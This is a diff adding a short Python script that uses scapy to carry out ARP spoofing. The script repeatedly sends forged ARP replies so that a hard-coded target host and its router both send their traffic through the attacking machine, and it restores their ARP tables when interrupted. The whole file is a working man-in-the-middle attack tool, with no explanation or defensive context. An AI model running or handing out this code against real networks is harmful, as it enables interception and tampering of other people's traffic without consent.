@@ -1,0 +1,63 @@
+import scapy.all as scapy
+import sys
+
+
+
+def scan(ip):
+    Arp_request=scapy.ARP(pdst=ip)
+    broadcost=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    pack=broadcost/Arp_request
+    answered_list=scapy.srp(pack, timeout=1, verbose=0)[0]
+    return answered_list[0][1].hwsrc
+
+
+
+def spoofer(ip_target, ip_router):
+    mac_target=scan(ip_target)
+    fool=scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_router)
+    scapy.send(fool, verbose=False)
+
+def interruptt(ip_dest, ip_gateway):
+    mac_dest=scan(ip_dest)
+    mac_router=scan(ip_gateway)
+    escape=scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_gateway, hwsrc=mac_router)
+    scapy.send(escape, count=4, verbose=False)
+
+target_ip="192.168.178.27"
+router_ip="192.168.178.1"
+
+try:
+    send_packets = 0
+    while True:
+        spoofer(target_ip, router_ip)
+        spoofer(router_ip, target_ip)
+        send_packets=send_packets+2
+        print("\r[+] sent packets = "+str(send_packets)),
+        sys.stdout.flush()
+        scapy.time.sleep(1)
+except KeyboardInterrupt:
+    print("[+] got out of spoofing while push Ctrl + C. quitting...")
+    interruptt(target_ip, router_ip)
+    interruptt(router_ip, target_ip)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
